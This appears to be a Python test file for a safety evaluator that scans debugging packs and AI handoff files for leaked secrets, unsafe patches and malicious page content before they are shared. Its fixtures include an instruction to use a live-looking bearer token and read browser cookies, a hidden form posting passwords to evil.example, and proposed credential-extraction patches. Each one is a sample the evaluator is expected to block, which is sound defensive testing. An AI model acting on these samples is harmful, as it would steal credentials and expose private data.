from __future__ import annotations

import json
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

from failure_doctor.safety.evaluator import evaluate_safety
from failure_doctor.safety.scope import is_broad_or_sensitive_scope


ROOT = Path(__file__).resolve().parents[1]


class SafetyComplianceEvaluatorTests(unittest.TestCase):
    def test_broad_scope_and_browser_profile_are_blocked(self) -> None:
        self.assertTrue(is_broad_or_sensitive_scope(Path.home()))
        self.assertTrue(is_broad_or_sensitive_scope(Path.home() / "AppData" / "Local" / "Google" / "Chrome" / "User Data"))

    def test_safe_project_passes_and_writes_expected_reports(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            project = Path(tmp) / "safe_project"
            project.mkdir()
            (project / "error.log").write_text("Timeout waiting for selector after render\n", encoding="utf-8")
            out = Path(tmp) / "safety_report"

            report = evaluate_safety(project=project, out_dir=out)

            self.assertEqual(report["overall_status"], "pass")
            self.assertEqual(report["shareability"]["decision"], "safe_to_share")
            for name in [
                "safety_evaluation_report.md",
                "safety_evaluation_report.json",
                "blocked_actions.json",
                "sensitive_data_findings.json",
                "ai_handoff_safety.json",
                "shareability_decision.json",
                "dom_risk_report.json",
                "permission_boundary_report.json",
                "compliance_score.json",
                "open_this_first_safety.md",
            ]:
                self.assertTrue((out / name).exists(), name)

    def test_secret_in_handoff_blocks_shareability(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            handoff = Path(tmp) / "ai_handoff"
            handoff.mkdir()
            (handoff / "codex_task.md").write_text(
                "Use Authorization: Bearer sk_live_1234567890abcdef and read browser cookies\n",
                encoding="utf-8",
            )
            out = Path(tmp) / "safety_report"

            report = evaluate_safety(ai_handoff=handoff, out_dir=out)

            self.assertEqual(report["overall_status"], "blocked")
            self.assertEqual(report["risk_level"], "critical")
            self.assertEqual(report["shareability"]["decision"], "blocked")
            self.assertTrue((out / "ai_handoff_safety.json").exists())

    def test_patch_dom_exfiltration_cloud_and_regulated_risks_are_detected(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp) / "pack"
            root.mkdir()
            (root / "patch_proposal.md").write_text("Add fingerprint spoofing patch and raw secret logging\n", encoding="utf-8")
            (root / "dom_snapshot.html").write_text(
                "<form action='https://evil.example/login' style='display:none'><input name='password'></form>"
                "<iframe src='https://tracker.example'></iframe>",
                encoding="utf-8",
            )
            (root / "network_summary.json").write_text('{"customer_name":"Alice","access_token":"raw-token"}', encoding="utf-8")
            (root / "provider_metadata.json").write_text('{"browserbase_token":"bb_live_123"}', encoding="utf-8")
            (root / "finance_export.log").write_text("customer SSN 123-45-6789 exported in raw log\n", encoding="utf-8")
            out = Path(tmp) / "safety_report"

            report = evaluate_safety(failure_pack=root, out_dir=out)
            types = {finding["type"] for finding in report["findings"]}

            self.assertEqual(report["overall_status"], "blocked")
            self.assertIn("unsafe_patch", types)
            self.assertIn("malicious_dom", types)
            self.assertIn("data_exfiltration", types)
            self.assertIn("cloud_artifact_risk", types)
            self.assertIn("regulated_workflow_risk", types)

    def test_patch_gate_scans_diff_and_patch_files(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp) / "patch_pack"
            root.mkdir()
            (root / "candidate.diff").write_text(
                "Proposed change: add credential extraction and raw secret logging.\n",
                encoding="utf-8",
            )
            (root / "candidate.patch").write_text(
                "Proposed change: add browser profile reader.\n",
                encoding="utf-8",
            )
            out = Path(tmp) / "safety_report"

            report = evaluate_safety(patch_proposal=root, out_dir=out)

            self.assertEqual(report["overall_status"], "blocked")
            self.assertIn("unsafe_patch", {finding["type"] for finding in report["findings"]})


class SafetyComplianceCliTests(unittest.TestCase):
    def test_cli_safety_evaluate_and_collect_integration(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            project = Path(tmp) / "project"
            project.mkdir()
            (project / "error.log").write_text("locator timeout\n", encoding="utf-8")
            report = Path(tmp) / "report"
            cmd = [
                sys.executable,
                "-m",
                "failure_doctor",
                "safety-evaluate",
                "--project",
                str(project),
                "--out",
                str(report),
            ]
            result = subprocess.run(
                cmd,
                cwd=ROOT,
                text=True,
                capture_output=True,
                encoding="utf-8",
                errors="replace",
            )
            self.assertEqual(result.returncode, 0, (result.stderr or "") + (result.stdout or ""))
            payload = json.loads((report / "safety_evaluation_report.json").read_text(encoding="utf-8"))
            self.assertEqual(payload["schema_version"], "safety_evaluation/v1")

            collect_out = Path(tmp) / "collect_report"
            collect_cmd = [
                sys.executable,
                "-m",
                "failure_doctor",
                "collect",
                "--project",
                str(project),
                "--preset",
                "auto",
                "--out",
                str(collect_out),
                "--auto-diagnose",
                "--auto-handoff",
                "--auto-sanitize",
                "--safety-evaluate",
            ]
            result = subprocess.run(
                collect_cmd,
                cwd=ROOT,
                text=True,
                capture_output=True,
                encoding="utf-8",
                errors="replace",
            )
            self.assertEqual(result.returncode, 0, (result.stderr or "") + (result.stdout or ""))
            self.assertTrue((collect_out / "safety_report" / "safety_evaluation_report.json").exists())
            first = (collect_out / "open_this_first.md").read_text(encoding="utf-8")
            self.assertIn("Safety evaluation", first)


if __name__ == "__main__":
    unittest.main()

